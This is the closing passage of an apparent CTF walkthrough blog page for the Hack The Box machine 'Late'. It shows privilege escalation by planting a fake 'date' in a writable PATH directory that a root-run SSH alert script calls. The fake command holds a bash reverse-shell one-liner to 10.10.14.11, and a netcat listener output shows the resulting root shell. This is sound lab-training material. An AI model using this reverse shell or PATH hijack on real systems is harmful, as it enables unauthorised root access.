class="line">svc_acc@late:/usr/local/sbin$</span><br></pre></td></tr></table></figure>
+
+<p>Using <code>pspy</code> we can see that the script is getting ran as a root user.  I might have been able to infer that given the $PAM usage but it never hurts to check.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">2022/06/22 14:41:21 CMD: UID=0    PID=2059   | sshd: svc_acc [priv]</span><br><span class="line">2022/06/22 14:41:21 CMD: UID=0    PID=2060   | /bin/bash /usr/local/sbin/ssh-alert.sh</span><br></pre></td></tr></table></figure>
+
+<p>We can now take advantage of the fact that we can execute a script (<code>ssh-alert.sh</code>) as root that takes some variables that we can control.  The next step is to create that variable.</p>
+<h2 id="Making-a-custom-date-command"><a href="#Making-a-custom-date-command" class="headerlink" title="Making a custom date command"></a>Making a custom <code>date</code> command</h2><p>One of the commands that <code>ssh-alert.sh</code> uses is the <code>date</code> command.  Let’s make a new <code>date</code> command.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">svc_acc@late:/usr/local/sbin$ <span class="built_in">which</span> <span class="built_in">date</span></span><br><span class="line">/bin/date</span><br><span class="line">svc_acc@late:/usr/local/sbin$ <span class="built_in">echo</span> <span class="string">&quot;/bin/bash -i &gt;&amp; /dev/tcp/10.10.14.11/2346 0&gt;&amp;1&quot;</span> &gt; <span class="built_in">date</span></span><br><span class="line">svc_acc@late:/usr/local/sbin$ <span class="built_in">chmod</span> +x <span class="built_in">date</span></span><br><span class="line">svc_acc@late:/usr/local/sbin$ <span class="built_in">which</span> <span class="built_in">date</span></span><br><span class="line">/usr/local/sbin/date</span><br></pre></td></tr></table></figure>
+
+<p>Setup the netcat listener and exit out of the original ssh session.  This will trigger our reverse shell to execute when <code>ssh-alert.sh</code> calls <code>date</code>.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[ none@microbial web ]$  nc -lvn 2346</span><br><span class="line">bash: cannot <span class="built_in">set</span> terminal process group (30241): Inappropriate ioctl <span class="keyword">for</span> device</span><br><span class="line">bash: no job control <span class="keyword">in</span> this shell</span><br><span class="line">root@late:/<span class="comment"># id</span></span><br><span class="line"><span class="built_in">id</span></span><br><span class="line">uid=0(root) gid=0(root) <span class="built_in">groups</span>=0(root)</span><br><span class="line">root@late:/<span class="comment"># cd /root</span></span><br><span class="line"><span class="built_in">cd</span> /root</span><br><span class="line">root@late:/root<span class="comment"># ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">root.txt</span><br><span class="line">scripts</span><br><span class="line">root@late:/root<span class="comment"># cat root.txt</span></span><br><span class="line"><span class="built_in">cat</span> root.txt</span><br><span class="line">7942.........................</span><br><span class="line">root@late:/root<span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="References"><a href="#References" class="headerlink" title="References:"></a>References:</h2><p><a target="_blank" rel="noopener" href="https://medium.com/@nyomanpradipta120/ssti-in-flask-jinja2-20b068fdaeee">IndominusByte excellent writeup on ssti</a><br><a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=SN6EVIG4c-0">pwn function video on ssti</a><br><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Linux_PAM">info on PAM</a></p>
+
+  </div>
+</article>
+<!-- 
+ -->
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Getting-User"><span class="toc-number">1.</span> <span class="toc-text">Getting User</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Recon"><span class="toc-number">1.1.</span> <span class="toc-text">Recon</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Home-Page"><span class="toc-number">1.1.1.</span> <span class="toc-text">Home Page</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Upload-Page"><span class="toc-number">1.1.2.</span> <span class="toc-text">Upload Page</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SSTI"><span class="toc-number">1.2.</span> <span class="toc-text">SSTI</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#First-Image"><span class="toc-number">1.2.1.</span> <span class="toc-text">First Image</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Second-Image"><span class="toc-number">1.2.2.</span> <span class="toc-text">Second Image</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Third-Image"><span class="toc-number">1.2.3.</span> <span class="toc-text">Third Image</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Forth-Image"><span class="toc-number">1.2.4.</span> <span class="toc-text">Forth Image</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Getting-Root"><span class="toc-number">2.</span> <span class="toc-text">Getting Root</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Write-Path-Abuse"><span class="toc-number">2.1.</span> <span class="toc-text">Write Path Abuse</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Making-a-custom-date-command"><span class="toc-number">2.2.</span> <span class="toc-text">Making a custom date command</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#References"><span class="toc-number">2.3.</span> <span class="toc-text">References:</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <!-- <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://k1ckstand.github.io/2022/06/08/late/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://k1ckstand.github.io/2022/06/08/late/&text=HTB: Late"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://k1ckstand.github.io/2022/06/08/late/&title=HTB: Late"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://k1ckstand.github.io/2022/06/08/late/&is_video=false&description=HTB: Late"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HTB: Late&body=Check out this article: https://k1ckstand.github.io/2022/06/08/late/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://k1ckstand.github.io/2022/06/08/late/&title=HTB: Late"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://k1ckstand.github.io/2022/06/08/late/&title=HTB: Late"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://k1ckstand.github.io/2022/06/08/late/&title=HTB: Late"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://k1ckstand.github.io/2022/06/08/late/&title=HTB: Late"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://k1ckstand.github.io/2022/06/08/late/&name=HTB: Late&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://k1ckstand.github.io/2022/06/08/late/&t=HTB: Late"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul> -->
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2022
+    k1ckstand
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+ 
+  <link
+    rel="preload"
+    href="/lib/font-awesome/css/all.min.css"
+    as="style"
+    onload="this.onload=null;this.rel='stylesheet'"
+  />
+  <noscript
+    ><link
+      rel="stylesheet"
+      href="/lib/font-awesome/css/all.min.css"
+  /></noscript>
+
+
+    <!-- jquery -->
+ 
+  
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+
+
+
+<!-- clipboard -->
+
+   
+    
+<script src="/lib/clipboard/clipboard.min.js"></script>
+
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
+
+
